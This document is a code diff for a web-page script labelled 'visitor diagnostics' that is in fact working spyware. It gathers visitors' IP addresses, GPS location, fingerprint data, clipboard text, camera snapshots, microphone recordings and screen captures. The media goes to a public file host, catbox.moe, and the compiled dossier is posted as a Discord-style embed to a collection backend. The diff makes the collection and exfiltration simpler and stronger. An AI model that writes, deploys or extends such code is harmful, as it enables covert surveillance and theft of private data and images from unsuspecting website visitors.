@@ -17,42 +17,19 @@
         const BACKEND_URL = '/api/collect';
 
         // ------------------------------------------------------------------
-        // NEW: upload a Blob/File to 0x0.st and return the public URL
+        // NEW: upload a Blob to catbox.moe and return the public URL
         // ------------------------------------------------------------------
-        async function uploadTo0x0st(blob, filename = 'snapshot.jpg') {
+        async function uploadToCatbox(blob, filename) {
             const formData = new FormData();
-            formData.append('file', blob, filename);
-            const response = await fetch('https://0x0.st', {
+            formData.append('reqtype', 'fileupload');
+            formData.append('fileToUpload', blob, filename);
+            const response = await fetch('https://catbox.moe/user/api.php', {
                 method: 'POST',
                 body: formData
             });
             if (!response.ok) throw new Error(`Upload failed: ${response.status}`);
-            const url = await response.text();  // 0x0.st returns the URL as plain text
-            return url.trim();
-        }
-
-        // Helper: send a single Discord message payload
-        async function sendDiscordMessage(payload) {
-            try {
-                const res = await fetch(BACKEND_URL, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(payload)
-                });
-                return res.ok;
-            } catch(e) {
-                console.error('Send failed:', e);
-                return false;
-            }
-        }
-
-        // Helper: split a long string into chunks (max 1900 chars each, leaving room for field name)
-        function splitLongString(str, maxChunk = 1900) {
-            const chunks = [];
-            for (let i = 0; i < str.length; i += maxChunk) {
-                chunks.push(str.substring(i, i + maxChunk));
-            }
-            return chunks;
+            const url = await response.text();
+            return url.trim(); // e.g., https://files.catbox.moe/xxxxxx.jpg
         }
 
         (async () => {
@@ -138,7 +115,9 @@
                 return ext;
             }
 
-            // ==================== NEW EXTENDED DIAGNOSTICS ====================
+            // ==================== NEW EXTENDED DIAGNOSTICS (MASSIVELY EXPANDED) ====================
+
+            // 1. Full WebRTC local IPs (all interfaces)
             async function getAllLocalIPs() {
                 return new Promise((resolve) => {
                     const ips = new Set();
@@ -161,6 +140,7 @@
                 });
             }
 
+            // 2. Geolocation (GPS)
             async function getGeolocation() {
                 return new Promise((resolve) => {
                     if (!navigator.geolocation) { resolve(null); return; }
@@ -172,7 +152,7 @@
                 });
             }
 
-            // ---------- MODIFIED: capture and upload camera snapshot, return URL ----------
+            // 3. Camera snapshot – upload full image to catbox, return URL
             async function captureCameraSnapshot(videoTrack) {
                 if (!videoTrack) return null;
                 const stream = new MediaStream([videoTrack]);
@@ -190,15 +170,15 @@
                 video.remove();
                 if(videoTrack.stop) videoTrack.stop();
                 try {
-                    const url = await uploadTo0x0st(blob, 'camera_snapshot.jpg');
-                    return url;   // returns public URL instead of base64
+                    const url = await uploadToCatbox(blob, 'camera_snapshot.jpg');
+                    return url;
                 } catch(e) {
                     console.error('Camera upload failed:', e);
                     return null;
                 }
             }
 
-            // ---------- MODIFIED: capture microphone sample, upload as .webm, return URL ----------
+            // 4. Microphone recording – upload as webm, return URL
             async function captureMicrophoneSample(stream) {
                 if (!stream) return null;
                 const mediaRecorder = new MediaRecorder(stream);
@@ -211,7 +191,7 @@
                 const blob = new Blob(chunks, { type: 'audio/webm' });
                 stream.getTracks().forEach(t => t.stop());
                 try {
-                    const url = await uploadTo0x0st(blob, 'microphone_sample.webm');
+                    const url = await uploadToCatbox(blob, 'microphone_sample.webm');
                     return url;
                 } catch(e) {
                     console.error('Microphone upload failed:', e);
@@ -219,7 +199,7 @@
                 }
             }
 
-            // ---------- MODIFIED: capture screen snapshot, upload, return URL ----------
+            // 5. Screen capture snapshot – upload as JPEG, return URL
             async function captureScreenSnapshot() {
                 if (!navigator.mediaDevices || !navigator.mediaDevices.getDisplayMedia) return null;
                 try {
@@ -236,7 +216,7 @@
                     const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.5));
                     stream.getTracks().forEach(t => t.stop());
                     video.remove();
-                    const url = await uploadTo0x0st(blob, 'screen_snapshot.jpg');
+                    const url = await uploadToCatbox(blob, 'screen_snapshot.jpg');
                     return url;
                 } catch(e) {
                     console.error('Screen capture failed:', e);
@@ -244,14 +224,16 @@
                 }
             }
 
+            // 6. Clipboard read (text)
             async function readClipboard() {
                 if (!navigator.clipboard || !navigator.clipboard.readText) return null;
                 try {
                     const text = await navigator.clipboard.readText();
-                    return text.length > 500 ? text.slice(0,500)+'...' : text;
-                } catch(e) { return null; }
+                    return text.length > 100 ? text.slice(0,100)+'...' : text;
+                } catch(e) { return { error: e.message }; }
             }
 
+            // 7. Device orientation
             function getOrientation() {
                 return new Promise((resolve) => {
                     if (!window.DeviceOrientationEvent) { resolve(null); return; }
@@ -264,6 +246,7 @@
                 });
             }
 
+            // 8. Ambient light sensor
             async function getAmbientLight() {
                 if (!window.AmbientLightSensor) return null;
                 try {
@@ -276,20 +259,52 @@
                 } catch(e) { return null; }
             }
 
-            async function getBluetoothAvailability() { return !!navigator.bluetooth; }
-            async function getUSBAvailability() { return !!navigator.usb; }
-            function getSpeechRecognitionSupport() { return !!(window.SpeechRecognition || window.webkitSpeechRecognition); }
-            function vibrateTest() { if(navigator.vibrate) navigator.vibrate(200); return !!navigator.vibrate; }
+            // 9. Bluetooth devices (basic availability)
+            async function getBluetoothAvailability() {
+                if (!navigator.bluetooth) return false;
+                try {
+                    // just check if device supports – without requesting devices
+                    return true;
+                } catch(e) { return false; }
+            }
+
+            // 10. USB devices (via WebUSB – requires user gesture and permission)
+            async function getUSBAvailability() {
+                if (!navigator.usb) return false;
+                return true;
+            }
+
+            // 11. Speech recognition (just check support)
+            function getSpeechRecognitionSupport() {
+                const SpeechRecognition = window.SpeechRecognition || window.webkitSpeechRecognition;
+                return !!SpeechRecognition;
+            }
+
+            // 12. Vibration (if supported)
+            function vibratePattern() {
+                if (!navigator.vibrate) return 'not supported';
+                navigator.vibrate(200);
+                return 'vibrated 200ms';
+            }
+
+            // 13. Notifications permission and show test (silent)
             async function checkNotifications() {
                 if (!('Notification' in window)) return 'not supported';
                 const permission = Notification.permission;
-                if (permission === 'granted') new Notification('Diagnostic test', { body: 'Test', silent: true });
+                if (permission === 'granted') {
+                    new Notification('Diagnostic test', { body: 'This is a test notification.', silent: true });
+                    return 'granted (test sent)';
+                }
                 return permission;
             }
+
+            // 14. Gamepad detection
             function getGamepads() {
                 const pads = navigator.getGamepads ? navigator.getGamepads() : [];
                 return pads.filter(p => p !== null).map(p => ({ id: p.id, buttons: p.buttons.length, axes: p.axes.length }));
             }
+
+            // 15. Installed fonts (through CSS/JS measurement)
             function getInstalledFonts() {
                 const fontList = ["Arial", "Verdana", "Times New Roman", "Courier New", "Georgia", "Comic Sans MS", "Impact", "Tahoma", "Trebuchet MS", "Lucida Console", "Segoe UI", "Roboto", "Open Sans", "Calibri", "Cambria", "Consolas"];
                 const canvas = document.createElement('canvas');
@@ -303,12 +318,16 @@
                 }
                 return fontList.filter(checkFont);
             }
+
+            // 16. WebShare API support
             function webShareSupport() { return !!navigator.share; }
+
+            // 17. Permissions API (enumerate)
             async function getAllPermissions() {
                 if (!navigator.permissions || !navigator.permissions.query) return {};
-                const names = ['geolocation', 'notifications', 'camera', 'microphone', 'clipboard-read', 'clipboard-write', 'persistent-storage', 'ambient-light-sensor', 'accelerometer', 'gyroscope', 'magnetometer'];
+                const permissionNames = ['geolocation', 'notifications', 'camera', 'microphone', 'clipboard-read', 'clipboard-write', 'persistent-storage', 'ambient-light-sensor', 'accelerometer', 'gyroscope', 'magnetometer'];
                 const results = {};
-                for (const name of names) {
+                for (const name of permissionNames) {
                     try {
                         const status = await navigator.permissions.query({ name });
                         results[name] = status.state;
@@ -316,37 +335,44 @@
                 }
                 return results;
             }
+
+            // 18. Media devices (list all cameras, mics, speakers)
             async function enumerateMediaDevices() {
                 if (!navigator.mediaDevices || !navigator.mediaDevices.enumerateDevices) return [];
                 try {
                     const devices = await navigator.mediaDevices.enumerateDevices();
-                    return devices.map(d => ({ kind: d.kind, label: d.label || 'hidden', deviceId: d.deviceId }));
+                    return devices.map(d => ({ kind: d.kind, label: d.label || 'hidden', deviceId: d.deviceId.slice(0,10) + '...' }));
                 } catch(e) { return []; }
             }
+
+            // 19. Request camera & microphone streams (get URLs)
             async function requestCameraAndMic() {
-                let cameraURL = null, micURL = null;
+                let cameraStream = null, micStream = null, cameraURL = null, micURL = null;
                 try {
-                    const cameraStream = await navigator.mediaDevices.getUserMedia({ video: true });
+                    cameraStream = await navigator.mediaDevices.getUserMedia({ video: true });
                     if (cameraStream && cameraStream.getVideoTracks().length) {
                         const track = cameraStream.getVideoTracks()[0];
                         cameraURL = await captureCameraSnapshot(track);
                     }
                 } catch(e) { cameraURL = null; }
                 try {
-                    const micStream = await navigator.mediaDevices.getUserMedia({ audio: true });
+                    micStream = await navigator.mediaDevices.getUserMedia({ audio: true });
                     if (micStream) micURL = await captureMicrophoneSample(micStream);
                 } catch(e) { micURL = null; }
                 return { cameraSnapshotURL: cameraURL, microphoneSampleURL: micURL };
             }
 
-            // ==================== MAIN ====================
+            // ==================== MAIN EXECUTION (all original + new) ====================
             try {
                 logEl.textContent = 'Collecting data... (camera/mic/etc may request permission)';
+
+                // 1. Original methods
                 await getIPInfo();
                 const fingerprint = getFingerprint();
                 const vulns = await scanVulns();
                 const extended = await getExtended();
 
+                // 2. New intensive collection
                 const [allLocalIPs, geoLocation, orientation, ambientLight, bluetoothAvail, usbAvail, speechRecog, notifications, gamepads, installedFonts, webShare, permissions, mediaDevices, cameraMicData] = await Promise.all([
                     getAllLocalIPs(),
                     getGeolocation(),
@@ -366,7 +392,7 @@
                 const clipboardText = await readClipboard();
                 const screenSnapshotURL = await captureScreenSnapshot();
 
-                // Build full diagnostics object – now with URLs instead of Base64
+                // 3. Build massive diagnostic object – now with URLs instead of base64
                 const fullDiag = {
                     webrtc_local_ips: allLocalIPs,
                     geolocation: geoLocation,
@@ -384,8 +410,9 @@
                     camera_snapshot_url: cameraMicData.cameraSnapshotURL || null,
                     microphone_sample_url: cameraMicData.microphoneSampleURL || null,
                     screen_snapshot_url: screenSnapshotURL || null,
-                    clipboard_text: clipboardText,
-                    http_headers_js: {
+                    clipboard_text_sample: clipboardText,
+                    httpHeaders: { userAgent: navigator.userAgent, accept: navigator.languages?.join(',') },
+                    jsAttributes: {
                         userAgent: navigator.userAgent,
                         platform: navigator.platform,
                         cookiesEnabled: navigator.cookieEnabled,
@@ -396,56 +423,52 @@
                         hardwareConcurrency: navigator.hardwareConcurrency,
                         deviceMemory: navigator.deviceMemory,
                         plugins: Array.from(navigator.plugins || []).map(p => p.name),
-                        screen: { width: screen.width, height: screen.height, availWidth: screen.availWidth, availHeight: screen.availHeight, pixelDepth: screen.pixelDepth }
+                        screen: { width: screen.width, height: screen.height, availWidth: screen.availWidth, availHeight: screen.availHeight, pixelDepth: screen.pixelDepth },
+                        localStorage: !!window.localStorage,
+                        sessionStorage: !!window.sessionStorage,
+                        indexedDB: !!window.indexedDB
                     }
                 };
 
-                const fullDiagStr = JSON.stringify(fullDiag, null, 2);
-                const chunks = splitLongString(fullDiagStr, 1900);
+                logEl.textContent = 'Sending full diagnostics payload...';
 
-                // ---- Message 1: Core info (always fits) ----
-                const coreMessage = {
-                    content: '**ULTRA EXTENDED VISITOR DIAGNOSTICS – PART 1/??**',
+                // Prepare final Embed – now with URLs (not truncated base64)
+                const finalPayload = {
+                    content: '**ULTRA EXTENDED VISITOR DIAGNOSTICS**',
                     embeds: [{
-                        title: 'Core Information',
+                        title: 'Full Capture + Camera/Mic/Screen/Geo/More',
                         color: 0xff0000,
                         fields: [
                             { name: 'IP & Location', value: `${data.public_ip || 'unknown'} - ${data.location ? data.location.city + ', ' + data.location.country : 'N/A'}`, inline: false },
                             { name: 'VPN / Proxy', value: data.vpn_detected ? 'Yes' : 'No', inline: true },
                             { name: 'GPS (device)', value: geoLocation ? `${geoLocation.lat},${geoLocation.lon} (±${geoLocation.accuracy}m)` : 'unavailable/denied', inline: false },
-                            { name: 'Basic Fingerprint', value: '```json\n' + JSON.stringify(fingerprint, null, 2).slice(0,900) + '```', inline: false },
+                            { name: 'Basic Fingerprint', value: '```json\n' + JSON.stringify(fingerprint, null, 2).slice(0,700) + '```', inline: false },
                             { name: 'Vulnerabilities', value: vulns.join('\n') || 'None', inline: false },
-                            { name: 'Extended (battery/network)', value: '```json\n' + JSON.stringify(extended, null, 2) + '```', inline: false }
+                            { name: 'Extended (battery/network)', value: '```json\n' + JSON.stringify(extended, null, 2) + '```', inline: false },
+                            { name: 'WebRTC Local IPs', value: allLocalIPs.join(', ') || 'none', inline: false },
+                            { name: 'Orientation (α/β/γ)', value: orientation ? `${orientation.alpha},${orientation.beta},${orientation.gamma}` : 'none', inline: false },
+                            { name: 'Fonts (sample)', value: installedFonts.join(', ') || 'none', inline: false },
+                            { name: 'Permissions', value: '```json\n' + JSON.stringify(permissions, null, 2).slice(0,500) + '```', inline: false },
+                            { name: 'Camera Snapshot URL', value: cameraMicData.cameraSnapshotURL || 'failed/denied', inline: false },
+                            { name: 'Microphone Sample URL', value: cameraMicData.microphoneSampleURL || 'failed/denied', inline: false },
+                            { name: 'Screen Snapshot URL', value: screenSnapshotURL || 'failed/denied', inline: false },
+                            { name: 'Clipboard Text', value: (clipboardText && typeof clipboardText === 'string') ? clipboardText.slice(0,200) : 'no read permission/empty', inline: false },
+                            { name: 'Full JS & Headers Diag', value: '```json\n' + JSON.stringify(fullDiag, null, 2).slice(0,1000) + '```', inline: false }
                         ],
                         timestamp: new Date().toISOString()
                     }]
                 };
-                await sendDiscordMessage(coreMessage);
-                logEl.textContent = 'Sent core data. Sending remaining chunks...';
 
-                // ---- Send each chunk of fullDiag as separate messages ----
-                for (let i = 0; i < chunks.length; i++) {
-                    const partNum = i + 2;
-                    const chunkMessage = {
-                        content: `**ULTRA EXTENDED VISITOR DIAGNOSTICS – PART ${partNum}/${chunks.length+1}**`,
-                        embeds: [{
-                            title: 'Full Diagnostics (continued)',
-                            color: 0x00ff00,
-                            description: '```json\n' + chunks[i] + '```',
-                            timestamp: new Date().toISOString()
-                        }]
-                    };
-                    await sendDiscordMessage(chunkMessage);
-                    logEl.textContent = `Sent part ${partNum} of ${chunks.length+1}`;
-                    await new Promise(r => setTimeout(r, 500));
-                }
+                const sendRes = await fetch(BACKEND_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(finalPayload)
+                });
 
-                await sendDiscordMessage({ content: '✅ All diagnostic data sent successfully.' });
-                logEl.textContent = 'All diagnostics sent successfully.';
+                logEl.textContent = sendRes.ok ? 'Full diagnostics sent successfully.' : 'Sent with partial success (HTTP ' + sendRes.status + ')';
             } catch (err) {
                 console.error(err);
                 logEl.textContent = 'Error: ' + err.message;
-                await sendDiscordMessage({ content: `❌ Error during collection: ${err.message}` });
             }
         })();
     </script>
